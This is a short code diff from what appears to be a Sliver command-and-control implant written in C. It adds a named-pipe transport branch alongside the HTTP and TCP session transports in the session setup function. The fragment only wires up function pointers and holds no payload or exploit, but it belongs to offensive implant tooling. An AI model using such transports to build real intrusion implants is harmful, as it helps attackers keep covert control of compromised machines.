@@ -19,13 +19,20 @@ PSLIVER_SESSION_CLIENT SessionInit
 	pSessionClient->Receive = HttpRecv;
 	pSessionClient->Close = HttpClose;
 	pSessionClient->Cleanup = HttpCleanup;
-#else
+#elif _TCP
 	pSessionClient->Init = (CLIENT_INIT)TcpInit;
 	pSessionClient->Start = TcpStart;
 	pSessionClient->Send = TcpSend;
 	pSessionClient->Receive = TcpRecv;
 	pSessionClient->Close = TcpClose;
 	pSessionClient->Cleanup = TcpCleanup;
+#else
+	pSessionClient->Init = (CLIENT_INIT)PipeInit;
+	pSessionClient->Start = PipeStart;
+	pSessionClient->Send = PipeSend;
+	pSessionClient->Receive = PipeRecv;
+	pSessionClient->Close = PipeClose;
+	pSessionClient->Cleanup = PipeCleanup;
 #endif
 
 CLEANUP:
